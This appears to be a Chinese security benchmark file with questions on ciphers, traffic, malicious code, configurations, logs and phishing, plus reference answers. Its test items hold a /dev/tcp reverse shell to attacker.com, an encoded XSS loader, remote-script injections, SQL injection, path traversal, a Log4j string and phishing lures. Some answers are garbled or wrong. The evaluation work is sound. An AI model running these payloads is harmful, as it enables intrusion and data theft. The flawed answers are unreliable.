@@ -1,0 +1,579 @@
+﻿序号,类型,题目,答案,模型输出,评测结果
+1,文件类型分析,47 49 46 38 37 61，请识别它代表哪种文件格式,GIF97a 属于GIF格式,,
+2,文件类型分析,57 69 6E 64 6F 77 73 20 33 2E 31 00 是什么文件格式：,Windows 3.1 相关文件,,
+3,文件类型分析,50 4B 03 04 14 00 00 00 08 00 6E 6F 6E 65 00 00 这是什么类型的文件,该数据以 50 4B 03 04 开头，表示这是一个 ZIP 压缩文件。,,
+4,文件类型分析,"42 4D 38 42 00 00 00 00 00 00 00 00 28 00 00 00
+00 01 00 00 00 01 00 00 01 00 18 00 00 00 00 00
+问题：
+该十六进制数据代表的文件类型是什么？
+根据文件头信息，描述该文件的基本结构，并指出图像的宽度和高度","文件类型：
+该数据以 42 4D 开头，表示这是一个 BMP（Bitmap）图像文件。
+基本结构：
+BMP 文件头包含以下字段：
+文件大小： 38 42 00 00 （在小端格式中转换为 0x004238，即 16976 字节）
+数据偏移量：28 00 00 00 （从文件头到实际图像数据的字节偏移）
+宽度：01 00 00 00 （在小端格式中转换为 1 像素）
+高度：01 00 00 00 （在小端格式中转换为 1 像素）",,
+5,文件类型分析,"分析文件类型，并检测是否含有恶意代码
+FFD8 FFE0 0010 4A46 4946 0001 0101 0048 0048 0000 FFDB 0043 0001 0101
+0101 0101 0101 0101 0101 0101 0101 0101 0101 0101 0101 0101 0101 0101
+...
+FFD9 3C73 6372 6970 742073 72633D 2768 7474 703A 2F2F 6261 6464 6F6D
+6169 6E2E 636F 6D2F 6D61 6C69 6369 6F75 732E 6A73 273E 3C2F 7363 7269 7074 3E","文件的Hex内容中，JPEG的正常文件内容结束于FFD9，但在FFD9之后出现了嵌入的HTML和JavaScript代码片段：
+
+<script src='http://baddomain.com/malicious.js'></script>
+该图片文件中嵌入了恶意JavaScript代码，试图通过加载远程的恶意脚本来进行恶意行为，如在用户浏览器上执行恶意操作或进行钓鱼攻击。",,
+6,密码分析,"给定以下替换密码系统：
+明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ
+密文字母表：ZYXWVUTSRQPONMLKJIHGFEDCBA
+现有密文如下：
+gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt
+请你使用上述替换密码系统将密文还原为明文。",明文：the quick brown fox jumps over the lazy dog,,
+7,密码分析,请解密：.... . .-.. .-.. --- .-- --- .-. .-.. -.. -.-.--,hello world!,,
+8,密码分析,"请解密base16的解密文本：
+666C61677B6D795F6E616D655F482121487D",flag{my_name_H!!H},,
+9,密码分析,"请进行unicode解密： \u0066\u006c\u0061\u0067\u007b\u0069\
+u005f\u0077\u0069\u006c\u006c\u005f\u006b\
+u0069\u006c\u006c\u005f\u0079\u006f\u0075
+\u0021\u007d",flag{i_will_kill_you!},,
+10,密码分析,"题目：
+给定一段密文，它是使用维吉尼亚密码（Vigenère cipher）加密的。密钥为“LEMON”，请你解密得到明文。
+密文：
+LXFOPVEFRNHR",ATTACKATDAWN,,
+11,流量分析,"分析以下 HTTP 请求报文，找出恶意部分，并解释其潜在影响。
+
+POST /api/execute HTTP/1.1
+Host: victim.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 600
+cmd=kill_all_users();&malicious_code=DROP TABLE users; -- ","恶意部分：
+kill_all_users();：试图删除所有用户。
+DROP TABLE users; --：SQL 注入，试图删除用户表。
+潜在影响：可能导致数据丢失和用户访问权限被撤销，影响系统完整性。",,
+12,流量分析,"分析以下 TCP 报文，观察它是否是恶意流量
+  TCP Segment
+Source Port: 55555
+Destination Port: 80
+Sequence Number: 123456789
+Acknowledgment Number: 987654321
+Flags: [SYN] 
+Data Length: 0 bytes
+Data: Nmap scan initiated","  恶意部分：
+Flags：SYN，表明发起了连接请求，可能进行端口扫描。",,
+13,流量分析,"分析以下 HTTP 请求报文
+
+GET /search?q=' OR '1'='1 HTTP/1.1 
+Host: victim.com 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","恶意部分：
+查询参数 q=' OR '1'='1：经典 SQL 注入攻击。",,
+14,流量分析,"分析以下 HTTP 请求报文
+
+GET /../../etc/passwd HTTP/1.1
+Host: victim.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","恶意部分：
+请求路径 /../../etc/passwd：尝试访问敏感文件。",,
+15,流量分析,"请分析这段流量-10.0.0.2 → 10.0.0.5 (TCP, 445, payload: ""smbexec"") -10.0.0.5 → 10.0.0.2 (TCP, 445, response: ""Access Denied"") -10.0.0.2 → 10.0.0.5 (TCP, 3389, payload: ""RDP brute force attempts"")","SMB 445端口活动：
+请求：10.0.0.2 → 10.0.0.5 (TCP, 445, payload: ""smbexec"")
+响应：10.0.0.5 → 10.0.0.2 (TCP, 445, response: ""Access Denied"")
+RDP 3389端口活动：
+请求：10.0.0.2 → 10.0.0.5 (TCP, 3389, payload: ""RDP brute force attempts"")
+攻击分析
+SMB（Server Message Block）活动：
+攻击意图：smbexec是一个常见的攻击工具或命令，旨在通过SMB协议进行远程代码执行或命令执行。这里的""Access Denied""响应表明目标机器拒绝了该请求，可能是因为权限不足或SMB共享未正确配置。
+潜在影响：如果攻击成功，攻击者可能会获取目标系统的控制权或敏感数据。
+RDP（Remote Desktop Protocol）活动：
+攻击意图：""RDP brute force attempts""表明在尝试通过暴力破解来获取远程桌面访问权限。此类攻击通常会发送大量的登录请求，试图猜测用户凭据。
+潜在影响：如果暴力破解成功，攻击者可以获得对目标主机的完全访问权限，从而执行任意命令、窃取数据或部署恶意软件。",,
+16,流量分析,"请分析这段流量HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 3470
+Last-Modified: Tue, 21 Sep 2023 12:00:00 GMT
+ETag: ""5a3e2-3f4c76c8-5c42c4f1""
+Content-Encoding: gzip
+Content-Disposition: inline; filename=""2.png""
+
+iVBORw0KGgoAAAANSUhEUgAAAAUA
+AAAACAIAAADQ1tl1AAAAHHRFWHRDcmV
+hdGlvbk1vZGUgV2luZG93cyAwOC4xLj
+U2QZ8F9QAAAACXBIWXMAAB7CAAAewgFu0HU+AAAB
+cElEQVR42mP8z8wFzKcAEEAABJw9WhP7jzAAAAA
+AElFTkSuQmCC
+... 
+Extra-Data: 636F6465733A207072696E742077696E646F77732E6578616D706C652E636F6D203A203139322E31372E322E31333A3130373920","Extra-Data: 这里的十六进制字符串表示了一个典型的反向shell木马指令，例如 ""codes: print windows.example.com: 192.17.2.13:1079""。当被解码后，它可能用于连接到指定的IP和端口，从而执行恶意操作。",,
+17,恶意代码分析,"分析以下 JavaScript 代码，解释潜在漏洞
+
+var _0xabc123 = function(_0xdef456) {
+ var _0x789abc = [""\x61\x6C\x65\x72\x74"", ""\x77\x68\x6F""];
+ return _0x789abc[0] + _0x789abc[1]; 
+};
+
+if (location.hostname === _0xabc123()) {
+ var script = document.createElement('script');
+ script.src = ""http://malicious.com/malware.js""; 
+ document.body.appendChild(script);
+}","木马部分：
+动态加载恶意脚本 http://malicious.com/malware.js。
+混淆技术：
+字符串使用十六进制表示法进行混淆。
+潜在影响：攻击者可以在用户的浏览器中执行恶意代码，窃取敏感信息。",,
+18,恶意代码分析,"分析该php代码，并解释其潜在漏洞<?php
+// 数据库连接
+$conn = new mysqli(""localhost"", ""user"", ""password"", ""database"");
+
+// 用户输入
+ _GET['username'];
+ _GET['page'];
+
+
+ username'"";
+ conn->query($sql);
+ result->fetch_assoc();
+
+
+include(""pages/"" . $page . "".php"");
+
+if ($user) {
+    echo ""Welcome, "" . $user['name'];
+} else {
+ echo ""Invalid user."";
+}
+?>","漏洞部分：
+SQL 注入：使用用户输入的 $username 直接拼接到 SQL 查询中。
+文件包含：用户可以通过 page 参数控制包含的文件，可能包含任意 PHP 文件。
+潜在影响：
+SQL 注入可能导致数据泄露或账户劫持。
+文件包含漏洞可能导致敏感文件的泄露或任意代码执行。",,
+19,恶意代码分析,"分析这段代码#include <windows.h>
+#include <stdio.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BackgroundTask, NULL, 0, NULL);
+            break;
+    }
+    return TRUE;
+}
+
+void BackgroundTask() {
+    char pseudoCmd[] = { 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00 };
+    
+    for (int i = 0; i < 5; i++) {
+        Sleep(100);
+    }
+
+    ExecuteCommand(pseudoCmd);
+}
+
+void ExecuteCommand(char* command) {
+    system(command);
+}","变量名伪装：
+原来的 MaliciousFunction 函数改名为 BackgroundTas
+obfuscatedCmd 变量改名为 pseudoCmd
+执行命令的函数改名为 ExecuteCommand
+命令混淆：
+notepad.exe 这个字符串以 ASCII 码的形式表示，用 16 进制形式初始化，并且将字符串用 char[] 来保存，这种形式不容易被简单的字符串搜索发现。
+伪造的无害代码：
+在 BackgroundTask 中添加了一个简单的 for 循环和 Sleep() 调用，看起来像是无害的延迟操作，增加了迷惑性
+代码逻辑分离：
+真正的命令执行被放在了另一个函数 ExecuteCommand 中，进一步将恶意行为分离成多步，使得分析难度增加。",,
+20,恶意代码分析,"分析以下代码，找出潜在漏洞：
+'""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdWouY2kvanUwIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>","XSS 攻击：该代码利用了 XSS 漏洞，将恶意代码注入到用户的浏览器中。攻击者可以通过这个方式执行任意脚本，获取用户敏感信息、劫持用户会话，甚至控制用户的浏览器行为。
+代码混淆：Base64 编码使得恶意代码在源代码中不易被察觉，进一步提高了攻击的隐蔽性。",,
+21,恶意代码分析,"分析以下代码，找出潜在漏洞：
+h1=""aHR0cHM6Ly9hdHRhY2tlci5jb20=""的 Base64 编码 host=$(echo$h1 | base64 --decode | cut -d'/' -f3) port=$((1300 + 37)) exec 9<>/dev/tcp/$host/$port cmd=""cat <&9 | while read x; do \$x 2>&9 >&9; done""eval$cmd",这个代码是一个通过反向 shell 来执行远程命令的攻击脚本。它的目的是让攻击者通过 TCP 连接执行任意命令,,
+22,脆弱配置分析,"分析以下数据库配置，解释其脆弱性
+
+
+CREATE USER 'admin'@'%' IDENTIFIED BY 'password123';
+GRANT ALL PRIVILEGES ON . TO 'admin'@'%';
+FLUSH PRIVILEGES;","潜在风险：
+admin 用户可以从任何主机连接，这增加了被攻击的风险。
+授予了所有数据库的所有权限，若被攻击者获取，将导致严重数据泄露。",,
+23,脆弱配置分析,"分析IIS配置，检查是否存在漏洞<system.webServer><modules><add name=""WebDAVModule"" /></modules><handlers><add name=""WebDAV"" path=""*"" verb=""PROPFIND,PUT,DELETE,MKCOL,COPY,MOVE,LOCK,UNLOCK"" modules=""WebDAVModule"" resourceType=""Unspecified"" requireAccess=""None"" /></handlers></system.webServer>",这允许用户使用 PUT 方法上传文件到服务器。,,
+24,脆弱配置分析,"分析Tomcat配置，检查是否存在漏洞 <user username=""admin"" password=""admin"" roles=""manager-gui,admin-gui""/>","弱密码：admin/admin 是非常常见且简单的默认用户名和密码组合，攻击者可以轻松猜测或使用暴力破解工具进行尝试。
+广泛的权限：这个用户拥有 manager-gui 和 admin-gui 两个角色，意味着它可以访问 Tomcat 的管理界面、部署新的应用（如恶意 WAR 文件），并执行几乎所有的管理操作。",,
+25,脆弱配置分析, 分析该SSH配置，是否存在漏洞  PasswordAuthentication yes PermitRootLogin yes,"密码认证启用：PasswordAuthentication yes 允许通过密码登录 SSH，这会增加暴力破解攻击的风险，特别是如果使用弱密码。
+允许 root 登录：PermitRootLogin yes 允许通过 root 用户直接登录，攻击者一旦获取 root 密码就能完全控制服务器。",,
+26,脆弱配置分析,"分析该Apache配置 <Directory ""/var/www/html""> Options Indexes FollowSymLinks AllowOverride None </Directory>","启用目录索引：Options Indexes 允许浏览目录内容，如果没有保护，攻击者可以查看目录结构并访问敏感文件。
+缺乏目录访问控制：未限制特定目录的访问权限，可能导致敏感文件泄露。",,
+27,日志分析,"分析日志，是否有被攻击的痕迹Oct 22 11:00:01 server sshd[12345]: Failed password for root from 192.168.1.50 port 22 ssh2
+Oct 22 11:00:05 server sshd[12345]: Failed password for root from 192.168.1.50 port 22 ssh2
+Oct 22 11:00:10 server sshd[12345]: Failed password for root from 192.168.1.50 port 22 ssh2
+Oct 22 11:00:15 server sshd[12345]: Failed password for root from 192.168.1.50 port 22 ssh2
+Oct 22 11:00:20 server sshd[12345]: Accepted password for root from 192.168.1.50 port 22 ssh2
+Oct 22 11:01:00 server kernel: [123456.789012] [INFO] process miner started with PID 54321
+Oct 22 11:01:05 server crontab[54322]: (root) REPLACE (crontab entry) */5 * * * * /usr/local/bin/miner
+Oct 22 11:05:00 server miner[54321]: [INFO] Starting mining operation on 192.168.1.51
+Oct 22 11:05:30 server miner[54321]: [ERROR] Connection failed to pool at 192.168.1.52
+Oct 22 11:06:00 server miner[54321]: [INFO] Mining operation successful, hash rate: 150 H/s","爆破尝试: 从 192.168.1.50 的多个 SSH 登录失败记录，显示攻击者在尝试使用暴力破解访问 root 用户。
+成功登录: 最终的成功登录表明攻击者成功获得了系统的访问权限。
+恶意进程: 日志中显示的 miner 进程和 crontab 记录表明该进程被设置为定期执行，表明挖矿活动在后台持续进行。",,
+28,日志分析,"分析日志，是否有被攻击的痕迹Oct 22 15:45:01 server syslog[67890]: [WARNING] Unauthorized process attempt: /tmp/updater.exe
+Oct 22 15:45:05 server syslog[67890]: [INFO] Process started: /tmp/updater.exe, PID: 98765
+Oct 22 15:45:10 server syslog[67890]: [INFO] File modification detected: /etc/passwd
+Oct 22 15:45:15 server syslog[67890]: [INFO] Network connection established: 192.168.1.80:4444
+Oct 22 15:46:00 server syslog[67890]: [ALERT] Potential data exfiltration detected from /home/user/documents","未授权进程: /tmp/updater.exe 可能是攻击者植入的木马。
+文件修改: /etc/passwd 的修改提示攻击者试图提升权限。
+网络连接: 与 192.168.1.80:4444 的连接可能指向远程控制服务器。
+数据外泄: 数据外泄警告显示系统安全风险。",,
+29,日志分析,"分析日志，是否有被攻击的痕迹Oct 22 20:00:01 server webserver[67890]: [ALERT] Incoming request with suspicious payload detected
+Oct 22 20:00:02 server webserver[67890]: [INFO] Client IP: 203.0.113.25 - User-Agent: curl/7.68.0 - Payload: ${jndi:ldap://example.com/a}
+Oct 22 20:00:03 server firewall[12345]: [BLOCK] Traffic from 203.0.113.25 blocked due to JNDI lookup attempt
+Oct 22 20:00:04 server webserver[67890]: [ERROR] Potential vulnerability exploited - review access logs for further details","可疑请求: 记录到可疑负载请求，显示用户试图利用 Log4j 漏洞。
+客户端信息: 请求来自 203.0.113.25，通过 curl 发起，显示其特征。
+流量阻止: 防火墙日志显示成功阻止了来自该 IP 的流量。
+漏洞利用警告: 错误日志表明检测到潜在的利用尝试，需要审查访问日志进行后续分析。",,
+30,日志分析,"Aug 3 15:00:55 server webserver[76543]: [INFO] GET request to /login from IP: 192.0.2.56
+Aug 3 15:00:56 server webserver[76543]: [INFO] GET request to /admin from IP: 192.0.2.56
+Aug 3 15:00:57 server webserver[76543]: [INFO] GET request to /admin/settings from IP: 192.0.2.56
+Aug 3 15:00:58 server webserver[76543]: [INFO] GET request to /dashboard from IP: 192.0.2.56
+Aug 3 15:00:59 server webserver[76543]: [INFO] GET request to /login from IP: 192.0.2.56
+Aug 3 15:01:00 server webserver[76543]: [INFO] GET request to /unknown from IP: 192.0.2.56",请求没有明显的攻击行为，表面上像是用户浏览页面，但如果注意到访问的是一些可能的管理或后台页面，如 /admin、/dashboard 等，攻击者可能在探测敏感路径，寻找未授权访问的入口点。,,
+31,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+ 
+  
+ 
+亲爱的用户： 
+ 
+为了加强网络安全管理，提高邮件系统的安全性和稳定性，保障收发畅通，为用户提供优质的服务，现即将启用新版系统，有关事项通知如下：
+ 
+1.用户需登录新邮件系统将原有数据备案进行保存升级。
+ 
+2.未备案升级数据的用户，系统将其认定为无人使用的账户并停止服务。
+ 
+3.备案升级后用户名和密码均不变，用户无需修改客户端软件设置。
+ 
+点此登录完成本次升级（http://qiyeyouxiangbazx.com/7MvYDUlXRpPERA5DlFr2vOfBzv4HEW8I）
+ 
+ 
+ 
+ 
+ 
+特此通知
+ 
+2023/8/22
+ 
+ 
+ 
+ ",钓鱼邮件,,
+32,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+2023年度通信，网络，与信息系统国际会议
+
+2023年3月25-27日，桂林 （线下线上同时）
+
+本会议论文集提交Springer旗下 Lecture Notes in Computer Science (LNCS) 出版，收入会议论文集的文章全部提交EI Compendex和CPCI(ISTP)双收录。
+
+桂林山青、水秀、洞奇、石美，具有亚热带岩溶峰林景观，典型的喀斯特地貌构成了世上最美的山水奇迹，山水风光举世闻名，千百年来享有“桂林山水甲天下”的美誉。
+
+请在会议网站 https://www.cnis-conf.org/ 在线投稿（只限英文稿件）。注册、版面等信息也请浏览会议网站。
+
+欢迎转发!
+
+会议组委会
+cnis_conf@126.com
+
+
+",普通邮件,,
+33,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+
+邮箱OA更新
+
+
+
+各位公司同事，您好！
+
+
+正在OA系统更新,没有进行OA系统更新的用户三天后将无法使用。
+您当前的IMAP版本较低，建议立即升级
+
+点击进行OA更新（https://fkvv.xyz/）
+
+
+
+小贴士：IMAP属于同步协议，您在移动端或MAC端需要正常使用，请在2023-2-20前完成OA系统更新！
+
+
+
+",钓鱼邮件,,
+34,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+财务部2023年第一季度个人劳动补贴申领通知
+
+
+
+《2023年财政第一季度劳动补贴》声明
+
+1、根据国家财政部、国家税务总局、国家市场监督管理总局、工商行政管理局联合下发
+
+《2023年财政第一季度劳动补贴》现已开展。
+
+2、工资补贴、疫情补贴、社保补贴、医保补贴、毕业生补贴、中高级技工生活补贴、工龄补贴、交通补贴、医疗保险、失业保险、生育保险等。
+
+3、登记的银行卡将会转入相应的补贴金（1000人民币以上）不纳入工资和奖金,收到通知后，请立即使用手机扫一扫以下二维码认证领取。
+
+该通知已经送达各单位，未完成领取的请抓紧当日领取，逾期视为放弃申领！
+
+
+
+手机扫一扫，按照提示操作领取 [二维码图片]
+
+
+
+主办单位：国务院办公厅　运行维护单位：中国政府网运行中心
+
+版权所有：中国政府网　中文域名：中国政府网.政务
+
+　京ICP备05070218号　京公网安备11010202000001号",钓鱼邮件,,
+35,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+On 2023-02-03 11:09 Lily Li Wrote:
+
+
+
+Hello, 
+
+
+
+Happy 2023! Wishing you all the best the whole year through.
+Hope you are doing well.
+
+
+
+I am Lily Li from Board Technology Services Ltd and our office is located in Hong Kong.
+
+
+We are looking for the listed products that is attached, could you pls let us know if you have them in stock or any reliable sales agent we can contact?
+
+Looking forward to hearing from you soon.
+
+
+
+
+
+
+
+Thanks and best regards, 
+
+
+
+Lily Li
+
+Exporting Director/Chief Operating Officer Board
+
+
+
+Board Technology Services Ltd
+
+Add: RM 2014, Houston Centre, 73 Mody Road, Tsim Sha Tsui East Hong Kong
+
+Tel: +852 2676 3324 
+
+Mobile: +852 2676 2311
+
+
+
+Save a tree. Don't print this e-mail unless it's necessary 
+
+?????? ????,??????????? 附件：BTSL catalogue_2023_samples_list_revised.exe",钓鱼邮件,,
+36,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+老师：2月下旬线上开展《单细胞单细胞转录组学数据分析、绘图及空间转录组分析》 
+
+一：单细胞测序技术与应用 
+
+二：单细胞组学数据分析实操 
+
+三：单细胞转录组轨迹、通路、转录因子等分析及绘图实操 
+
+四：空间转录组+单细胞测序联合分析 
+
+详情可见附件",普通邮件,,
+37,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+Hi，
+
+
+
+1、我是为企业提供礼品采购的陈晓飞，如：商务伴手礼、节日礼品、活动礼品、员工关怀礼品、客户维护礼品，等等。
+
+
+
+2、马上就到三八妇女节了，企业一般都会有给员工或客户礼品的习惯，我司与国内众多品牌商合作，如：金龙鱼、飞利浦、美的、来伊份，等等。
+
+
+
+3、我们的服务范围很广，比如：定制台历、家用电器、食品粮油、数码产品、生鲜海鲜、坚果礼包、等等。
+
+
+
+4、我们具备强大的供应链，确保品质与价格优质，鼓励客户进行多方比价，欢迎各位的咨询，若有打扰，望海涵。
+
+
+
+陈晓飞 Felix
+
+176 0210 0048（微信同号）",普通邮件,,
+38,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+关于财务部通知2023年第一季度个人劳动补贴申领通知，请查收附件！附件：重要通知请查收.docx",钓鱼邮件,,
+39,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+系统通知 
+
+
+为进一步提升邮件系统的性能和安全，更好地为广大用户提供服务，本系统将对邮件系统进行切换。 
+
+请点击登陆完成原邮件系统中用户邮件至云邮箱系统的迁移。 
+
+
+登陆 
+
+（http://www.loppu.top/?err=WIXQ2AP5FSQHFDJKNGYJN7998NJHH4VNKFEU7&dispatch=463&id=a63c1Ba813A9A18B807mmlAC8aahhbnijmaC0c13&e=fxlmath@xju.edu.cn）",钓鱼邮件,,
+40,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+尊敬的北京大学师生:
+您好!
+enA1 O1模型等)。该平台具备代码生成、数据处理、模型验证、文献检索等功能，可助您加速科研进程为了支持理学部的科研与教学工作，本校引进了先进的大语言模型平台(支持目前前沿的O
+主要功能:
+代码生成:自动生成科学计算代码，提高编程效率。数据处理:高效整理和分析实验数据。模型验证:辅助验证科学模型，提升研究准确性文献检索:获取最新研究动态，紧跟学科前沿。期待您的积极参与，充分利用平台资源。
+申请链接:https://portal.pku.edu.cn/lm/apply.jsp特此通知",钓鱼邮件,,
+41,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...#邮件内容#
+你好 [-User-]
+您的密码今天到期。请选择更改密码或
+保留当前密码（https://larosatowel.com/wp-admin/xiamei/New%20folder/index.php?email=）
+[-Domain-]",钓鱼邮件,,
+42,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+尊敬的用户您好:我们很高兴通知你
+您的QQ帐号已被系统抽选为本公司举办【周年庆典活动】的二等奖用户,您将获得由本公司送出的惊喜奖金￥66000元以及三星公司赞助的奖品三星
+时尚笔记本电脑一台。请您收到消息后立即登录领奖官方网:www.qquuccqq.com领取您的获奖幸运码为〖1688〗幸运用户查看消息后请立即删除此邮件,避免黑客冒充幸运用户领取奖项。请妥善保管好您的颁奖码。
+注:为了确保您的幸运资格不被冒领，请及时查看邮件。否则此邮件自动转入垃圾箱为垃圾邮件!",钓鱼邮件,,
+43,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+Dear all:
+近期微软发布了本月安全更新补丁，其中包含一个RDP(远程桌面服务)远程代码执行漏洞的补丁更新，对应CVE编号:CVE-2019-0708,现需要所有员工电脑需打上最新的漏
+洞补丁，漏洞补丁可直接下裁附件运行即可。
+附件：CVE-2019-0708.EXE",钓鱼邮件,,
+44,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+主题：【淘宝】您的专属优惠券等待领取！ 尊敬的淘宝用户， 您好！ 感谢您一直以来对淘宝的支持与厚爱。为了回馈广大用户，我们特此为您准备了一份专属优惠券。 请点击下方链接，领取您的优惠券，享受购物乐趣！🎉 点击领取优惠券（http://www.taoba0.com/ ） 优惠券使用规则： 有效期至2023年12月31日。适用于淘宝平台内指定商品。每个账户限领一次，数量有限，先到先得。请注意，我们的优惠券不会要求您提供任何敏感信息，如密码或银行账户详情。如有任何疑问，请直接联系我们的客服团队。 感谢您的参与，祝您购物愉快！ 此致淘宝团队
+这是钓鱼的嘛",钓鱼邮件,,
+45,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+尊敬的用户：
+你于2024年9月8日10:51在北京市（IP:xxx.xxx.xxx.xxx）修改了本邮箱密码，修改终端：网页版。如果不是本人操作，请立即更换密码。",普通邮件,,
+46,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+感谢你对我们工作的关注！
+1.由于投稿之后对框架进行了一些调整，代码和实验还在重新测试中，预测下个月可以开源。
+2.simulation的范围比较大，你可以先看一下人大（https://arxiv.org/abs/2308.11432）或者复旦（https://arxiv.org/abs/2309.07864）的survey确定要对什么进行模拟。如果你指的是social simulation，可以参考：
+- 社交网络相关：
+https://arxiv.org/abs/2208.04024
+https://arxiv.org/abs/2307.14984
+https://arxiv.org/abs/2403.09498
+- 推荐系统相关：
+https://arxiv.org/abs/2306.02552
+https://arxiv.org/abs/2310.10108
+- 其他社会学相关：
+https://arxiv.org/abs/2311.09665
+https://arxiv.org/abs/2311.17227
+https://arxiv.org/abs/2404.15532
+祝好，",普通邮件,,
+47,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+Hi,
+有些事情可能你已经忘记，但我们依然记得。今天(10月18日)是你的生日，我们唱了一首歌送给你，希望它能给你带来一些惊喜和欢乐。Happy Birthday。",普通邮件,,
+48,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+View it in Your Browser
+
+Welcome to This Week in Neo4j, your weekly fix for news from the world of graph databases!
+We start this week with a deep dive into Knowledge Graphs and how they work. From there, we have a video interview on how to start with Neo4j, learn how to retrieve info from graphs and embeddings for a chatbot and analyse the Q1 earnings from PepsiCo.
+
+Join our Neo4j User Research panel! Sign up to share your experiences with a researcher and influence the future of Neo4j products.
+What’s in it for you? A chance to connect directly with product development teams, get paid compensation, hear about what we are working on, and more!
+
+I hope you enjoy this issue,
+Alexander Erdl",普通邮件,,
+49,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+主题：关于贵公司产品售后服务咨询
+尊敬的客服人员，
+您好！我于上月购买了一款贵公司的笔记本电脑，在使用过程中遇到了一些问题。我想咨询一下关于售后服务的相关事宜，以便尽快解决我的问题。
+贵公司的售后服务时间是多久？
+是否可以提供上门维修服务？
+若产品需要更换，流程是怎样的？
+请您尽快回复，谢谢！
+祝工作顺利！",普通邮件,,
+50,钓鱼邮件识别,"#任务#
+请分析并判断以下邮件是否为钓鱼邮件
+#示例#
+[普通邮件/钓鱼邮件]。因为...
+#邮件内容#
+邮箱已满，无法接收新邮件
+尊敬的发送者，
+很抱歉，我的邮箱目前容量已满，无法接收新的邮件。我会尽快清理邮箱空间，并回复您的邮件。
+如果您的事务紧急，请通过电话联系我，电话号码是xxx-xxx-xxxxx
+谢谢您的理解与耐心",普通邮件,,
